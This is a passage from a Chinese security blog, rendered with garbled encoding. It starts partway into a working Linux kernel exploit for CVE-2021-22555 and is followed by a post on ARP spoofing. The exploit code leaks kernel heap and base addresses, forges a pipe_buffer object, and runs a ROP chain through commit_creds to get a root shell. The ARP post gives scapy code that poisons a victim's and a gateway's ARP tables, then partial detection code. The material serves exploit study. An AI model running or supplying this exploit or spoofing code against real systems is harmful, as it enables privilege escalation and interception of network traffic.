&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak adjacent secondary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The secondary message contains a pointer to the primary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (PRIMARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF000000000000</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 2-3. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x400)  (forge msg_msg-&gt;next)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Put kheap_addr at next to leak its content. Assumes zero bytes before</span></span><br><span class="line">  <span class="comment">// kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                <span class="keyword">sizeof</span>(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      <span class="comment">// fist 8 bytes must be NULL</span></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read from kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The primary message contains a pointer to the secondary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (SECONDARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Calculate the address of the fake secondary message.</span></span><br><span class="line">  kheap_addr -= SECONDARY_SIZE;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF00000000FFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3. leak kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 3: KASLR bypass\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3-1. forge `msg_msg-&gt;m_list-&gt;next &amp; prev` so that list_del() does not crash.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, kheap_addr, kheap_addr, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-2. free secondary msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing sk_buff data buffer...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), MTYPE_FAKE) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-3. spray pipe_buffer object</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] pipe&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Write something to populate pipe_buffer.</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipefd[i][<span class="number">1</span>], <span class="string">&quot;pwn&quot;</span>, <span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3-4. leak pipe_buffer-&gt;ops â€”â€” kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking and freeing pipe_buffer object...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_rmid;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>] != MTYPE_FAKE)</span><br><span class="line">        pipe_buffer_ops = *(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">  kbase_addr = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] anon_pipe_buf_ops: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, pipe_buffer_ops);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kbase_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kbase_addr &amp; <span class="number">0xFFFF0000000FFFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel base address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 4. hijack control-flow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 4: Kernel code execution\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4-1. use skb to forge fake pipe_buffer</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//hijack rsp</span></span><br><span class="line">  fake_pipe_buffer = (struct pipe_buffer *)&amp;secondary_buf;</span><br><span class="line">  fake_pipe_buffer-&gt;ops = kheap_addr;</span><br><span class="line">  </span><br><span class="line">  fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;</span><br><span class="line">  fake_pipe_buffer_ops-&gt;release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;                  <span class="comment">//</span></span><br><span class="line">  fake_pipe_buffer_ops-&gt;confirm = kernel_offset + ADD_RSP_0x98_RET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> *mid_gadget;</span><br><span class="line">  mid_gadget = (<span class="keyword">uint64_t</span>*) (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0x2e</span>];</span><br><span class="line">  mid_gadget[<span class="number">0</span>] = kernel_offset + POP_RSP_RET;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4-2. construct ROP chain</span></span><br><span class="line">  <span class="comment">//build rop</span></span><br><span class="line">    <span class="keyword">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0xa0</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 4-3. trigger pipe_release()</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Releasing pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">1</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_rmid:</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == fake_idx)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (msgctl(msqid[i], IPC_RMID, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      perror(<span class="string">&quot;[-] msgctl&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">err_no_rmid:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ•ˆæœï¼š</p>
<p>ä¸­é—´æœ‰ä¸ª<code>getchar()</code>ï¼ŒæŒ‰ä¸‹å›è½¦å³å¯ï¼Œæœ¬æ¥æ”¾è¿™æ˜¯ä¸ºäº†æ–¹ä¾¿è°ƒè¯•çš„ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png" alt="image-20220515143144038"></p>
<p>ä¸è¡Œçš„è¯å¯ä»¥å¤šå°è¯•å‡ æ¬¡</p>
<p>ç„¶åé€ƒé€¸å®¹å™¨çš„æˆ‘æ²¡å°è¯•ï¼Œä¹Ÿä¸å¤ªä¼šï¼Œå¯ä»¥å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#FINAL-EXPLOIT" >arttnba3å¸ˆå‚…çš„å®¹å™¨é€ƒé€¸EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="å‚è€ƒ"   >
          <a href="#å‚è€ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html" >CVE-2021-22555: Turning \x00\x00 into 10000$ | security-research (google.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å¤ªå¤šäº†ï¼Œæœ‰ç‚¹è´´ä¸è¿‡æ¥äº†â€¦.</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/07/arp_spoof/">arp_spoof</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-07</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€åŸç†"   >
          <a href="#ä¸€ã€åŸç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€åŸç†" class="headerlink" title="ä¸€ã€åŸç†"></a>ä¸€ã€åŸç†</h1>
      
        <h2 id="1-æ”»å‡»"   >
          <a href="#1-æ”»å‡»" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ”»å‡»" class="headerlink" title="1.æ”»å‡»"></a>1.æ”»å‡»</h2>
      
        <h3 id="1-æ¬ºéª—å—å®³è€…"   >
          <a href="#1-æ¬ºéª—å—å®³è€…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ¬ºéª—å—å®³è€…" class="headerlink" title="(1)æ¬ºéª—å—å®³è€…"></a>(1)æ¬ºéª—å—å®³è€…</h3>
      <p>å‘å—å®³è€…å‘åŒ…ï¼Œæ¬ºéª—å—å®³è€…æœ¬æœºä¸ºç½‘å…³ï¼Œä½¿å¾—å—å®³è€…çš„ARPè¡¨ä¸­æœ¬æœºçš„MACåœ°å€ä¸ºç½‘å…³çš„MACåœ°å€ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rep</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    <span class="comment">#print(gateway_ip)</span></span><br><span class="line">    <span class="keyword">if</span> target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># Etherå¯¹åº”åŒ…çš„srcå’Œdst   ARPåªä¼šä¿®æ”¹å…¶ä¸­çš„ARPåŒ…ï¼Œå‘Šè¯‰dstï¼Œè¿™ä¸ªåŒ…çš„macæ˜¯hwsrcï¼Œipæ˜¯psrcï¼Œå‘ç»™hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip,</span><br><span class="line">                                                    op=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># æœ¬æœºmac å—æ¬ºéª—çš„ä¸»æœºmac æœ¬æœºmac ç½‘å…³çš„ipåœ°å€ è¢«æ”»å‡»äººçš„mac è¢«æ”»å‡»äººçš„ip OPå€¼æ˜¯è¡¨ç¤ºè¯·æ±‚è¿˜æ˜¯å›åº” 1ï¼šè¯·æ±‚  2ï¼šå›åº”</span></span><br><span class="line">        <span class="comment"># é‚£ä¹ˆè¿™ç§æ¨¡å¼ä¸‹å³æœ¬æœºå‘å¾€å—å®³è€…ï¼Œå‘Šè¯‰å—å®³è€…ç½‘å…³(psrc)çš„macåœ°å€æ˜¯æœ¬æœº(self_mac)ï¼Œä¸‹å›ä¾æ®IPæŸ¥ARPè¡¨å°±ä¼šæŠŠåº”è¯¥å‘ç»™ç½‘å…³çš„åŒ…é€šè¿‡macå‘åŒ…å‘ç»™æœ¬æœº</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-æ¬ºéª—ç½‘å…³"   >
          <a href="#2-æ¬ºéª—ç½‘å…³" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ¬ºéª—ç½‘å…³" class="headerlink" title="(2)æ¬ºéª—ç½‘å…³"></a>(2)æ¬ºéª—ç½‘å…³</h3>
      <p>å‘ç½‘å…³å‘åŒ…ï¼Œæ¬ºéª—ç½‘å…³å—å®³è€…ä¸ºæœ¬æœºï¼Œä½¿å¾—ç½‘å…³çš„ARPè¡¨ä¸­å—å®³è€…çš„MACåœ°å€ä¸ºæœ¬æœºçš„MACåœ°å€</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Etherå¯¹åº”åŒ…çš„srcå’Œdst   ARPåªä¼šä¿®æ”¹å…¶ä¸­çš„ARPåŒ…ï¼Œå‘Šè¯‰dstï¼Œè¿™ä¸ªåŒ…çš„macæ˜¯hwsrcï¼Œipæ˜¯psrcï¼Œå‘ç»™hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,</span><br><span class="line">                                                  op=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># æœ¬æœºmac ç½‘å…³mac æœ¬æœºmac å—æ¬ºéª—çš„ä¸»æœºmac ç½‘å…³mac ç½‘å…³çš„ipåœ°å€ OPå€¼æ˜¯è¡¨ç¤ºè¯·æ±‚è¿˜æ˜¯å›åº” 1ï¼šè¯·æ±‚  2ï¼šå›åº”</span></span><br><span class="line">    <span class="comment"># é‚£ä¹ˆè¿™ç§æ¨¡å¼ä¸‹å³æœ¬æœºå‘å¾€ç½‘å…³ï¼Œå‘Šè¯‰ç½‘å…³å—å®³è€…(psrc)çš„macåœ°å€æ˜¯æœ¬æœº(self_mac)ï¼Œä¸‹å›ä¾æ®IPæŸ¥ARPè¡¨å°±ä¼šæŠŠåº”è¯¥å‘ç»™å—å®³è€…çš„åŒ…é€šè¿‡macå‘åŒ…å‘ç»™æœ¬æœº</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-æ¬ºéª—æ‰€æœ‰äºº"   >
          <a href="#3-æ¬ºéª—æ‰€æœ‰äºº" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ¬ºéª—æ‰€æœ‰äºº" class="headerlink" title="(3)æ¬ºéª—æ‰€æœ‰äºº"></a>(3)æ¬ºéª—æ‰€æœ‰äºº</h3>
      <p>å‘å¹¿æ’­åœ°å€å‘åŒ…ï¼Œä½¿å¾—æ‰€æœ‰äººçš„ARPéƒ½è¢«ä¿®æ”¹ï¼Œä»è€Œæ¬ºéª—æ‰€æœ‰äººï¼Œè¿™ä¸ªæ²¡æœ‰å®ç°ï¼Œæ„Ÿè§‰åŠ¨é™å¤ªå¤§ï¼Œæ²¡å•¥ç”¨</p>

        <h2 id="2-é˜²å¾¡"   >
          <a href="#2-é˜²å¾¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é˜²å¾¡" class="headerlink" title="2.é˜²å¾¡"></a>2.é˜²å¾¡</h2>
      
        <h3 id="1-æ£€æµ‹"   >
          <a href="#1-æ£€æµ‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ£€æµ‹" class="headerlink" title="(1)æ£€æµ‹"></a>(1)æ£€æµ‹</h3>
      
        <h4 id="â‘ repæ¨¡å¼"   >
          <a href="#â‘ repæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ repæ¨¡å¼" class="headerlink" title="â‘ repæ¨¡å¼"></a>â‘ repæ¨¡å¼</h4>
      <p>è¿™ç§æ¨¡å¼æœ¬æœºçš„arpè¡¨ä¸­çš„MACåœ°å€ä¼šæ”¹å˜ï¼Œlinuxä¸‹ç”±äºè¾“å…¥arpåŠ è½½æ¯”è¾ƒæ…¢ï¼Œä¼°è®¡åå°ä¼šè¿›è¡Œpingï¼Œæ‰€ä»¥ä½¿ç”¨<code>ip neigh</code>æ¥è·å–ï¼Œä»ä¸­æ‰¾åˆ°æ˜¯å¦å­˜åœ¨ç›¸åŒçš„MACåœ°å€ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦è¢«è¯¥æ¨¡å¼æ”»å‡»ï¼Œå³è½¬åŒ–ä¸ºsetçœ‹é•¿åº¦æ˜¯å¦ç›¸åŒ</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_rep</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(ip_mac_dictionary) != <span class="built_in">len</span>(<span class="built_in">set</span>(ip_mac_dictionary.values()))):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rep_get&quot;</span>)</span><br><span class="line">    rep_detect_flag = <span class="literal">True</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡reqæ¨¡å¼"   >
          <a href="#â‘¡reqæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡reqæ¨¡å¼" class="headerlink" title="â‘¡reqæ¨¡å¼"></a>â‘¡reqæ¨¡å¼</h4>
      <p>è¿™ç§æ¨¡å¼ä¸‹æˆ‘ä»¬å¯ä»¥å°è¯•arpingç½‘å…³ï¼Œå¦‚æœMACåœ°å€æ²¡è¢«ä¿®æ”¹ï¼Œè€Œarpingç½‘å…³ä¸èƒ½é€šï¼Œé‚£ä¹ˆå°±æ˜¯ç½‘å…³è¢«æ¬ºéª—ï¼Œä¾æ®æ­¤æ¥è¿›è¡Œæ£€æµ‹</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_req</span></span><br><span class="line">gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">p = subprocess.Popen([<span class="string">&quot;arping&quot;</span>,<span class="string">&quot;-i&quot;</span>,netD_name,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>,gateway_mac], stdout=subprocess.PIPE)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">    line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;Timeout&quot;</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">        req_detect_flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å®é™…é˜²å¾¡"   >
          <a href="#2-å®é™…é˜²å¾¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å®é™…é˜²å¾¡" class="headerlink" title="(2)å®é™…é˜²å¾¡"></a>(2)å®é™…é˜²å¾¡</h3>
      
        <h4 id="â‘ repæ¨¡å¼-1"   >
          <a href="#â‘ repæ¨¡å¼-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ repæ¨¡å¼-1" class="headerlink" title="â‘ repæ¨¡å¼"></a>â‘ repæ¨¡å¼</h4>
